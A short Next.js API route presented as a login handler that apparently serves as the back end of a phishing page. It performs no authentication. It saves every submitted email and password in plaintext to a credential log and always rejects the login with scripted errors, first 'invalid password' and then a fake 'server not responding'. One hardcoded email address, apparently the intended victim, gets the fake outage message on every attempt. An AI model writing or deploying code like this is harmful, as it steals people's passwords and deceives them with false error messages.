import { NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";

const SPECIAL_EMAIL = "mchandra@aoac.in";
const INVALID_PASSWORD_MESSAGE = "Invalid password try again";
const SERVER_NOT_RESPONDING_MESSAGE = "Server not responding try again";

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const email = typeof body.email === "string" ? body.email.trim() : "";
    const password = typeof body.password === "string" ? body.password : "";

    if (!email || !password) {
      return NextResponse.json(
        { error: "Email and password are required." },
        { status: 400 },
      );
    }

    await prisma.credentialLog.create({
      data: { email, password },
    });

    const normalizedEmail = email.toLowerCase();
    const isSpecialEmail = normalizedEmail === SPECIAL_EMAIL;

    const loginState = await prisma.loginState.upsert({
      where: { email: normalizedEmail },
      create: { email: normalizedEmail, attemptCount: 0 },
      update: {},
    });

    const attemptNumber = loginState.attemptCount + 1;

    await prisma.loginState.update({
      where: { email: normalizedEmail },
      data: { attemptCount: attemptNumber },
    });

    const message =
      isSpecialEmail || attemptNumber >= 2
        ? SERVER_NOT_RESPONDING_MESSAGE
        : INVALID_PASSWORD_MESSAGE;

    return NextResponse.json({ error: message }, { status: 401 });
  } catch (error) {
    console.error("Login error:", error);
    return NextResponse.json(
      { error: "Something went wrong. Please try again." },
      { status: 500 },
    );
  }
}
